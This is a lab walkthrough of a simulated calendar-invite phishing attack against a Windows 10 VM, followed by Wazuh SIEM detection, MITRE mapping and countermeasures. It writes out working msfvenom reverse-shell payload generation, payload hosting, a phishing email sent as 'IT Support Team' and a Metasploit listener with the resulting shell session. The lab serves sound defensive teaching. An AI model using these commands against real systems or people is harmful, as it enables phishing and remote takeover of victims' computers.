# Task 2: Google Calendar Phishing Attack — Full Walkthrough

## Overview

This task simulates a real-world social engineering attack where a threat actor
crafts a malicious iCalendar (`.ics`) invite that delivers a Windows reverse shell
payload. The attack is detected using the Wazuh SIEM platform.

---

## Environment

| Role | Machine | IP |
|------|---------|-----|
| Attacker | Kali Linux VM | 10.33.3.49 |
| Victim | Windows 10 VM | 10.33.3.50 |
| IDS/SIEM | Wazuh Manager | 10.33.3.4 |
| Network mode | Bridged | — |

---

## Attack Flow

```
[Kali Attacker]                                [Windows 10 Victim]
     │                                               │
     │  Step 1: Generate payload (msfvenom)          │
     │  Step 2: Host rasd.exe on Apache (:80)        │
     │  Step 3: Craft malicious_invite.ics           │
     │  Step 4: Send phishing email ────────────────►│
     │                                               │  Step 5: Victim opens .ics
     │                                               │  Step 6: Downloads rasd.exe
     │◄──────────────── Reverse TCP shell ───────────│
     │  Step 7: Meterpreter session opened           │
     │                                               │
     │                                    [Wazuh 10.33.3.4]
     │                                               │
     │                                    Wazuh Rule 92217 fires
     │                                    "Executable dropped in
     │                                     Windows root folder"
```

---

## Step-by-Step Commands

### Step 1 — Generate the Meterpreter Payload (Attacker: Kali)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.33.3.49 \
    LPORT=4444 \
    -f exe > rasd.exe
```

**Output:**
```
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x86 from the payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

Verify the payload:
```bash
ls -lh rasd.exe
# -rw-r--r-- 1 kali kali 73K Jul 12 03:54 rasd.exe
```

---

### Step 2 — Host Payload on Apache (Attacker: Kali)

```bash
sudo mv rasd.exe /var/www/html/
sudo chmod 755 /var/www/html/rasd.exe
sudo systemctl start apache2
sudo systemctl status apache2     # confirm: active (running)
```

Verify the file is accessible:
```bash
curl -I http://localhost/rasd.exe
# HTTP/1.1 200 OK
```

---

### Step 3 — Create the Malicious Calendar Invite (Attacker: Kali)

```bash
nano malicious_invite.ics
```

The `.ics` file embeds the attacker's payload URL in the `LOCATION` field and
`DESCRIPTION` field. When the victim imports the event, the URL appears as a
clickable link. Full file: [`malicious_invite.ics`](malicious_invite.ics)

---

### Step 4 — Send the Phishing Email (Attacker: Kali)

```bash
# Edit GMAIL_USER, GMAIL_PASS, and TO_EMAIL in the script first
nano send_calendar_invite.py

# Run it
python3 send_calendar_invite.py
# Expected: Email sent successfully!
```

The victim receives an email from "IT Support Team" with subject
"Urgent Security Update Required" and a `malicious_invite.ics` attachment.

---

### Step 5 — Start the Metasploit Listener (Attacker: Kali)

```bash
# Option A: Use the resource script
msfconsole -r configs/metasploit_handler.rc

# Option B: Manual
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.33.3.49
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

**Expected output:**
```
[*] Started reverse TCP handler on 10.33.3.49:4444
```

---

### Step 6 — Victim Executes the Payload (Victim: Windows 10)

1. Victim opens Gmail, sees the calendar invite email from "IT Support Team"
2. Clicks "Add to Calendar" or downloads `malicious_invite.ics`
3. Clicks the download link in the event description (LOCATION field)
4. `rasd.exe` downloads and executes

**Meterpreter session opens on attacker side:**
```
[*] Sending stage (175686 bytes) to 10.33.3.50
[*] Meterpreter session 1 opened (10.33.3.49:4444 → 10.33.3.50:52884)

meterpreter > getuid
Server username: DESKTOP-D7CIS06\nurea
```

---

## Wazuh Detection

### Alert Details

| Field | Value |
|-------|-------|
| Agent | Dolon_Victim (Agent 003) |
| Rule ID | 92217 |
| Rule Level | 8 |
| Description | Executable dropped in Windows root folder |
| MITRE Technique | T1570 — Lateral Tool Transfer |
| MITRE Tactic | Lateral Movement |

### Why Does Wazuh Fire?

The Wazuh agent on the Windows 10 victim monitors the filesystem via FIM (syscheck).
When `rasd.exe` is written to the Windows user directory (a location commonly
used by malware droppers), Wazuh Rule 92217 fires.

**Rule 92217 definition:**
```xml
<rule id="92217" level="8">
  <if_sid>92200</if_sid>
  <field name="win.eventdata.targetFilename" type="pcre2">(?i)\\(Users|Windows|Temp)\\.*\.exe$</field>
  <description>Executable dropped in folder commonly used by malware</description>
  <group>sysmon,sysmon_eid11_detections,windows</group>
  <mitre>
    <id>T1570</id>
  </mitre>
</rule>
```

### Kibana Query

Navigate to **Wazuh → Security Events** and filter:
```
rule.id:92217 AND agent.name:Dolon_Victim
```

---

## MITRE ATT&CK Mapping

| Phase | Technique | ID |
|-------|-----------|-----|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 |
| Execution | User Execution: Malicious File | T1204.002 |
| Command & Control | Application Layer Protocol | T1071.001 |
| Lateral Movement | Lateral Tool Transfer | T1570 |

---

## Countermeasures

1. **Email filtering** — Block `.ics` attachments from unknown senders
2. **Disable autorun** for `.ics` files in the OS calendar application
3. **EDR** — Flag unsigned executables downloaded from HTTP links
4. **DNS filtering** — Block resolution of attacker-controlled domains
5. **Wazuh FIM** — Detect and alert on executables dropped in user directories
6. **User awareness training** — Train users to verify calendar invites
